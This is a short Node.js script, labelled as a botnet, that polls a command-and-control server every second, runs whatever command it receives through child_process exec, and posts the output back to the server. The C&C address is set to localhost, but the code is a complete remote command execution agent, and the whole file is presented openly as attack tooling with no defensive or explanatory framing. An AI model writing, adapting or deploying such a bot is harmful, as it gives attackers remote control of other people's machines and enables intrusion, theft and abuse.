const request = require('request');
const { exec } = require('child_process');

const CANDC_URL = 'http://localhost:3000';

// Command and control (C&C) server
const startBotnet = () => {
  setInterval(() => {
    request(`${CANDC_URL}/command`, (error, response, body) => {
      if (error) {
        console.error(error);
      } else {
        try {
          const { command } = JSON.parse(body);
          exec(command, (error, stdout, stderr) => {
            const result = stdout || stderr || error.message;
            request.post(`${CANDC_URL}/report`, {
              json: { result }
            }, (error, response, body) => {
              if (error) {
                console.error(error);
              } else {
                console.log(body);
              }
            });
          });
        } catch (error) {
          console.error(error);
        }
      }
    });
  }, 1000);
};

// Start the botnet
startBotnet();
